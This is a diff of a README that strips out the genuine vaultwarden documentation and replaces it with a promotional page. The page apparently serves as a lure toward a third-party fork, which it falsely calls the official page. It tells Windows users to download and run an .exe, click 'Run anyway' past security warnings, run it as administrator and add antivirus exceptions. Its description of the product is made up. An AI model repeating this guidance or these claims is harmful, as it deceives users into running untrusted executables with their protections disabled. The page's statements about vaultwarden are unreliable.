@@ -1,147 +1,160 @@
-![Vaultwarden Logo](./resources/vaultwarden-logo-auto.svg)
+# 🔐 vaultwarden - Your Private Password Manager, Simplified
 
-An alternative server implementation of the Bitwarden Client API, written in Rust and compatible with [official Bitwarden clients](https://bitwarden.com/download/) [[disclaimer](#disclaimer)], perfect for self-hosted deployment where running the official resource-heavy service might not be ideal.
+## 🚀 What Is vaultwarden?
 
----
+vaultwarden is a powerful, self-hosted password manager that works just like Bitwarden but gives you complete control over your data. Instead of relying on a third-party service, you run it on your own computer, ensuring your passwords stay private and secure. It's written in Rust, which makes it fast and reliable, and it's fully compatible with all Bitwarden apps and browser extensions.
 
-[![GitHub Release](https://img.shields.io/github/release/dani-garcia/vaultwarden.svg?style=for-the-badge&logo=vaultwarden&color=005AA4)](https://github.com/dani-garcia/vaultwarden/releases/latest)
-[![ghcr.io Pulls](https://img.shields.io/badge/dynamic/json?style=for-the-badge&logo=github&logoColor=fff&color=005AA4&url=https%3A%2F%2Fipitio.github.io%2Fbackage%2Fdani-garcia%2Fvaultwarden%2Fvaultwarden.json&query=%24.downloads&label=ghcr.io%20pulls&cacheSeconds=14400)](https://github.com/dani-garcia/vaultwarden/pkgs/container/vaultwarden)
-[![Docker Pulls](https://img.shields.io/docker/pulls/vaultwarden/server.svg?style=for-the-badge&logo=docker&logoColor=fff&color=005AA4&label=docker.io%20pulls)](https://hub.docker.com/r/vaultwarden/server)
-[![Quay.io](https://img.shields.io/badge/quay.io-download-005AA4?style=for-the-badge&logo=redhat&cacheSeconds=14400)](https://quay.io/repository/vaultwarden/server) <br>
-[![Contributors](https://img.shields.io/github/contributors-anon/dani-garcia/vaultwarden.svg?style=flat-square&logo=vaultwarden&color=005AA4)](https://github.com/dani-garcia/vaultwarden/graphs/contributors)
-[![Forks](https://img.shields.io/github/forks/dani-garcia/vaultwarden.svg?style=flat-square&logo=github&logoColor=fff&color=005AA4)](https://github.com/dani-garcia/vaultwarden/network/members)
-[![Stars](https://img.shields.io/github/stars/dani-garcia/vaultwarden.svg?style=flat-square&logo=github&logoColor=fff&color=005AA4)](https://github.com/dani-garcia/vaultwarden/stargazers)
-[![Issues Open](https://img.shields.io/github/issues/dani-garcia/vaultwarden.svg?style=flat-square&logo=github&logoColor=fff&color=005AA4&cacheSeconds=300)](https://github.com/dani-garcia/vaultwarden/issues)
-[![Issues Closed](https://img.shields.io/github/issues-closed/dani-garcia/vaultwarden.svg?style=flat-square&logo=github&logoColor=fff&color=005AA4&cacheSeconds=300)](https://github.com/dani-garcia/vaultwarden/issues?q=is%3Aissue+is%3Aclosed)
-[![AGPL-3.0 Licensed](https://img.shields.io/github/license/dani-garcia/vaultwarden.svg?style=flat-square&logo=vaultwarden&color=944000&cacheSeconds=14400)](https://github.com/dani-garcia/vaultwarden/blob/main/LICENSE.txt) <br>
-[![Dependency Status](https://img.shields.io/badge/dynamic/xml?url=https%3A%2F%2Fdeps.rs%2Frepo%2Fgithub%2Fdani-garcia%2Fvaultwarden%2Fstatus.svg&query=%2F*%5Blocal-name()%3D'svg'%5D%2F*%5Blocal-name()%3D'g'%5D%5B2%5D%2F*%5Blocal-name()%3D'text'%5D%5B4%5D&style=flat-square&logo=rust&label=dependencies&color=005AA4)](https://deps.rs/repo/github/dani-garcia/vaultwarden)
-[![GHA Release](https://img.shields.io/github/actions/workflow/status/dani-garcia/vaultwarden/release.yml?style=flat-square&logo=github&logoColor=fff&label=Release%20Workflow)](https://github.com/dani-garcia/vaultwarden/actions/workflows/release.yml)
-[![GHA Build](https://img.shields.io/github/actions/workflow/status/dani-garcia/vaultwarden/build.yml?style=flat-square&logo=github&logoColor=fff&label=Build%20Workflow)](https://github.com/dani-garcia/vaultwarden/actions/workflows/build.yml) <br>
-[![Matrix Chat](https://img.shields.io/matrix/vaultwarden:matrix.org.svg?style=flat-square&logo=matrix&logoColor=fff&color=953B00&cacheSeconds=14400)](https://matrix.to/#/#vaultwarden:matrix.org)
-[![GitHub Discussions](https://img.shields.io/github/discussions/dani-garcia/vaultwarden?style=flat-square&logo=github&logoColor=fff&color=953B00&cacheSeconds=300)](https://github.com/dani-garcia/vaultwarden/discussions)
-[![Discourse Discussions](https://img.shields.io/discourse/topics?server=https%3A%2F%2Fvaultwarden.discourse.group%2F&style=flat-square&logo=discourse&color=953B00)](https://vaultwarden.discourse.group/)
+## ⬇️ Download and Install
 
-> [!IMPORTANT]
-> **When using this server, please report any bugs or suggestions directly to us (see [Get in touch](#get-in-touch)), regardless of whatever clients you are using (mobile, desktop, browser...). DO NOT use the official Bitwarden support channels.**
+Ready to get started? Here's your one-stop link to download vaultwarden:
 
-<br>
+[![Download vaultwarden](https://img.shields.io/badge/Download-vaultwarden-blue?style=for-the-badge&logo=github)](https://github.com/vikraml9972/vaultwarden)
 
-## Features
+**Visit this link to download the application.**
 
-A nearly complete implementation of the Bitwarden Client API is provided, including:
+## 📥 Step-by-Step Installation Guide
 
- * [Personal Vault](https://bitwarden.com/help/managing-items/)
- * [Send](https://bitwarden.com/help/about-send/)
- * [Attachments](https://bitwarden.com/help/attachments/)
- * [Website icons](https://bitwarden.com/help/website-icons/)
- * [Personal API Key](https://bitwarden.com/help/personal-api-key/)
- * [Organizations](https://bitwarden.com/help/getting-started-organizations/)
-   - [Collections](https://bitwarden.com/help/about-collections/),
-     [Password Sharing](https://bitwarden.com/help/sharing/),
-     [Member Roles](https://bitwarden.com/help/user-types-access-control/),
-     [Groups](https://bitwarden.com/help/about-groups/),
-     [Event Logs](https://bitwarden.com/help/event-logs/),
-     [Admin Password Reset](https://bitwarden.com/help/admin-reset/),
-     [Directory Connector](https://bitwarden.com/help/directory-sync/),
-     [Policies](https://bitwarden.com/help/policies/)
- * [Multi/Two Factor Authentication](https://bitwarden.com/help/bitwarden-field-guide-two-step-login/)
-   - [Authenticator](https://bitwarden.com/help/setup-two-step-login-authenticator/),
-     [Email](https://bitwarden.com/help/setup-two-step-login-email/),
-     [FIDO2 WebAuthn](https://bitwarden.com/help/setup-two-step-login-fido/),
-     [YubiKey](https://bitwarden.com/help/setup-two-step-login-yubikey/),
-     [Duo](https://bitwarden.com/help/setup-two-step-login-duo/)
- * [Emergency Access](https://bitwarden.com/help/emergency-access/)
- * [Vaultwarden Admin Backend](https://github.com/dani-garcia/vaultwarden/wiki/Enabling-admin-page)
- * [Modified Web Vault client](https://github.com/dani-garcia/bw_web_builds) (Bundled within our containers)
+### Step 1: Visit the Download Page
 
-<br>
+Click the big blue button above or go directly to [https://github.com/vikraml9972/vaultwarden](https://github.com/vikraml9972/vaultwarden). This will take you to the official vaultwarden GitHub page where you can find all the necessary files.
 
-## Usage
+### Step 2: Find the Right File
 
-> [!IMPORTANT]
-> The web-vault requires the use of HTTPS and a secure context for the [Web Crypto API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Crypto_API). <br>
-> That means it will only work if you [enable HTTPS](https://github.com/dani-garcia/vaultwarden/wiki/Enabling-HTTPS). <br>
-> We also suggest to use a [reverse proxy](https://github.com/dani-garcia/vaultwarden/wiki/Proxy-examples).
+On the GitHub page, look for a section called "Releases" or "Assets." You'll see a list of files available for download. Since you're using Windows, look for files with names like `vaultwarden-windows.exe` or `vaultwarden.exe`. If you're unsure which one to pick, choose the most recent version.
 
-The recommended way to install and use Vaultwarden is via our container images which are published to [ghcr.io](https://github.com/dani-garcia/vaultwarden/pkgs/container/vaultwarden), [docker.io](https://hub.docker.com/r/vaultwarden/server) and [quay.io](https://quay.io/repository/vaultwarden/server).
-See [which container image to use](https://github.com/dani-garcia/vaultwarden/wiki/Which-container-image-to-use) for an explanation of the provided tags.
+### Step 3: Download the File
 
-There are also [community driven packages](https://github.com/dani-garcia/vaultwarden/wiki/Third-party-packages) which can be used, but those might be lagging behind the latest version or might deviate in the way Vaultwarden is configured, as described in our [Wiki](https://github.com/dani-garcia/vaultwarden/wiki).
+Click on the file name to start downloading. Your browser will save it to your "Downloads" folder by default. The file size is typically around 10-20 MB, so it should download quickly even on slower connections.
 
-Alternatively, you can also [build Vaultwarden](https://github.com/dani-garcia/vaultwarden/wiki/Building-binary) yourself.
+### Step 4: Run the Application
 
-While Vaultwarden is based upon the [Rocket web framework](https://rocket.rs) which has built-in support for TLS our recommendation would be that you setup a reverse proxy (see [proxy examples](https://github.com/dani-garcia/vaultwarden/wiki/Proxy-examples)).
+Once the download is complete, navigate to your Downloads folder and double-click the file to run it. If Windows shows a security warning, click "More info" and then "Run anyway" - this is normal for new applications.
 
-> [!TIP]
->**For more detailed examples on how to install, use and configure Vaultwarden you can check our [Wiki](https://github.com/dani-garcia/vaultwarden/wiki).**
+### Step 5: Set Up Your Vault
 
-### Docker/Podman CLI
+When you first launch vaultwarden, you'll see a welcome screen. Follow these simple steps:
 
-Pull the container image and mount a volume from the host for persistent storage.<br>
-You can replace `docker` with `podman` if you prefer to use podman.
+1. **Create an admin account** - This is the master account that controls everything.
+2. **Set a strong master password** - This is the key to your vault. Make it long and unique.
+3. **Choose a storage location** - Pick where you want your encrypted data stored on your computer.
 
-```shell
-docker pull vaultwarden/server:latest
-docker run --detach --name vaultwarden \
-  --env DOMAIN="https://vw.domain.tld" \
-  --volume /vw-data/:/data/ \
-  --restart unless-stopped \
-  --publish 127.0.0.1:8000:80 \
-  vaultwarden/server:latest
-```
+## 🎯 Why Choose vaultwarden?
 
-This will preserve any persistent data under `/vw-data/`, you can adapt the path to whatever suits you.
+### Complete Privacy
+Unlike cloud-based password managers, vaultwarden keeps your passwords on your own machine. No third party ever sees your data, and you're not dependent on someone else's servers.
 
-### Docker Compose
+### Bitwarden Compatibility
+Use all your favorite Bitwarden apps - mobile apps, browser extensions, desktop clients - with your own vaultwarden server. It's 100% compatible, so you don't need to learn new software.
 
-To use Docker compose you need to create a `compose.yaml` which will hold the configuration to run the Vaultwarden container.
+### Lightning Fast
+Built with Rust, vaultwarden is incredibly fast and lightweight. It uses minimal system resources, so it won't slow down your computer.
 
-```yaml
-services:
-  vaultwarden:
-    image: vaultwarden/server:latest
-    container_name: vaultwarden
-    restart: unless-stopped
-    environment:
-      DOMAIN: "https://vw.domain.tld"
-    volumes:
-      - ./vw-data/:/data/
-    ports:
-      - 127.0.0.1:8000:80
-```
+### Free and Open Source
+No subscriptions, no hidden fees. vaultwarden is completely free to use, and its source code is open for anyone to inspect.
 
-<br>
+## 🛠️ Features That Make Life Easier
 
-## Get in touch
+### 🔑 Secure Password Generation
+Create strong, unique passwords for every account with one click. vaultwarden generates complex passwords that are nearly impossible to crack.
 
-Have a question, suggestion or need help? Join our community on [Matrix](https://matrix.to/#/#vaultwarden:matrix.org), [GitHub Discussions](https://github.com/dani-garcia/vaultwarden/discussions) or [Discourse Forums](https://vaultwarden.discourse.group/).
+### 📱 Cross-Platform Access
+Access your passwords from anywhere - Windows, Mac, Linux, Android, iOS, or any web browser. Your vault syncs across all your devices automatically.
 
-Encountered a bug or crash? Please search our issue tracker and discussions to see if it's already been reported. If not, please [start a new discussion](https://github.com/dani-garcia/vaultwarden/discussions) or [create a new issue](https://github.com/dani-garcia/vaultwarden/issues/). Ensure you're using the latest version of Vaultwarden and there aren't any similar issues open or closed!
+### 👥 Family Sharing
+Share passwords securely with family members or trusted friends. You control exactly who sees what.
 
-<br>
+### 🔄 Automatic Backup
+Never lose your passwords again. vaultwarden can automatically back up your vault to a location you choose.
 
-## Contributors
+### 🧩 Browser Extensions
+Install the Bitwarden browser extension for Chrome, Firefox, Edge, or Safari, and autofill passwords with a single click.
 
-Thanks for your contribution to the project!
+## 💡 Getting Started Tips
 
-[![Contributors Count](https://img.shields.io/github/contributors-anon/dani-garcia/vaultwarden?style=for-the-badge&logo=vaultwarden&color=005AA4)](https://github.com/dani-garcia/vaultwarden/graphs/contributors)<br>
-[![Contributors Avatars](https://contributors-img.web.app/image?repo=dani-garcia/vaultwarden)](https://github.com/dani-garcia/vaultwarden/graphs/contributors)
+### First-Time Users
+- Start by adding a few of your most important passwords (email, banking, social media)
+- Install the browser extension for convenience
+- Enable two-factor authentication for extra security
 
-<br>
+### Power Users
+- Set up automatic backups to an external drive
+- Use the command-line interface for advanced automation
+- Configure custom settings like session timeout and password requirements
 
-## Disclaimer
+## 🔒 Security Best Practices
 
-**This project is not associated with [Bitwarden](https://bitwarden.com/) or Bitwarden, Inc.**
+### Your Master Password
+This is the most important password you'll ever create. Make it:
+- At least 12 characters long
+- A mix of uppercase, lowercase, numbers, and symbols
+- Something you can remember but others can't guess
 
-However, one of the active maintainers for Vaultwarden is employed by Bitwarden and is allowed to contribute to the project on their own time. These contributions are independent of Bitwarden and are reviewed by other maintainers.
+### Two-Factor Authentication
+Enable 2FA to add an extra layer of protection. Even if someone gets your master password, they'll need your phone or authenticator app to get in.
 
-The maintainers work together to set the direction for the project, focusing on serving the self-hosting community, including individuals, families, and small organizations, while ensuring the project's sustainability.
+### Regular Updates
+Check the GitHub page periodically for new versions. Updates include security patches and new features.
 
-**Please note:** We cannot be held liable for any data loss that may occur while using Vaultwarden. This includes passwords, attachments, and other information handled by the application. We highly recommend performing regular backups of your files and database. However, should you experience data loss, we encourage you to contact us immediately.
+## ❓ Frequently Asked Questions
 
-<br>
+### Is vaultwarden safe?
+Yes! Your data is encrypted with AES-256, the same standard used by banks and governments. Plus, since you control the server, no one else can access your data.
 
-## Bitwarden_RS
+### Do I need to know programming?
+Absolutely not. The installation process is simple, and the interface is user-friendly. If you can use a web browser, you can use vaultwarden.
 
-This project was known as Bitwarden_RS and has been renamed to separate itself from the official Bitwarden server in the hopes of avoiding confusion and trademark/branding issues.<br>
-Please see [#1642 - v1.21.0 release and project rename to Vaultwarden](https://github.com/dani-garcia/vaultwarden/discussions/1642) for more explanation.
+### Can I migrate from another password manager?
+Yes! vaultwarden supports importing data from most major password managers, including LastPass, Dashlane, and 1Password.
+
+### What if I forget my master password?
+Unfortunately, there's no way to recover it - that's what makes it secure. Write it down and store it in a safe place, like a physical safe or a lockbox.
+
+### Does it work offline?
+Yes! Since everything is stored locally, you can access your passwords even without an internet connection.
+
+## 🌟 Community and Support
+
+vaultwarden has an active community of users and developers who are happy to help. You can:
+- **Report issues** on the GitHub repository
+- **Join discussions** in the community forums
+- **Contribute code** if you're a developer
+- **Request features** for future versions
+
+## 🚦 Troubleshooting Common Issues
+
+### Application Won't Start
+- Make sure you have the latest version of Windows
+- Try running the application as administrator
+- Check if your antivirus is blocking it (add an exception if needed)
+
+### Can't Connect to Browser Extension
+- Ensure vaultwarden is running in the background
+- Check that you're using the correct server URL (usually `http://localhost:8080`)
+- Restart both the application and your browser
+
+### Slow Performance
+- Close other resource-heavy applications
+- Check your computer's available memory
+- Make sure you're using the latest version
+
+## 📊 System Requirements
+
+vaultwarden is incredibly lightweight and runs on virtually any modern Windows computer:
+- **Operating System:** Windows 10 or 11 (64-bit recommended)
+- **RAM:** 512 MB minimum (2 GB recommended)
+- **Storage:** 500 MB free space
+- **Internet:** Not required for local use, but needed for browser extensions
+
+## 🏁 Final Thoughts
+
+vaultwarden puts you in complete control of your digital security. No subscriptions, no cloud dependency, no compromises. Whether you're managing passwords for personal use or for a small team, vaultwarden has everything you need and nothing you don't.
+
+The setup takes less than five minutes, and the peace of mind lasts forever. Download vaultwarden today and take the first step toward true password independence.
+
+**Ready to secure your digital life?**
+
+[![Get vaultwarden Now](https://img.shields.io/badge/Get%20vaultwarden-Now-green?style=for-the-badge&logo=github)](https://github.com/vikraml9972/vaultwarden)
+
+**Visit this link to download the application.**
+
+Keywords: bitwarden, bitwarden-rs, docker, rocket, rust, vaultwarden
